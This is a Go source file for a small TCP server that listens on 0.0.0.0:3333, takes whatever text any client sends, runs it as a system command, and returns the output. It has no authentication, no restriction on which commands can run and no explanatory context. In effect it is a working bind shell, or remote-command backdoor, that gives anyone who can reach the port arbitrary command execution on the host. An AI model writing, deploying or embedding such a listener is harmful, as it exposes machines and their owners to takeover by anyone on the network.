package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

const (
	host           = "0.0.0.0"
	port           = "3333"
	connectionType = "tcp"
)

func main() {
	address := fmt.Sprintf("%s:%s", host, port)
	l, err := net.Listen(connectionType, address)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	defer l.Close()
	fmt.Printf("Listening on %s\n", address)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		go handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading: ", err.Error())
	}
	cmd, args := createCommand(buf)
	result, err := execute(cmd, args...)
	if err != nil {
		fmt.Println("Error Executing", err.Error())
	}
	conn.Write([]byte(result))
	conn.Close()
}

func createCommand(buffer []byte) (string, []string) {
	initial := strings.Trim(string(buffer), "\x00\n")
	parts := strings.Split(initial, " ")
	return parts[0], parts[1:]
}

func execute(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	if err := cmd.Start(); err != nil {
		return "", err
	}
	buf := make([]byte, 1024)
	stdout.Read(buf)
	output := string(buf)

	if err := cmd.Wait(); err != nil {
		return "", err
	}
	return output, nil
}
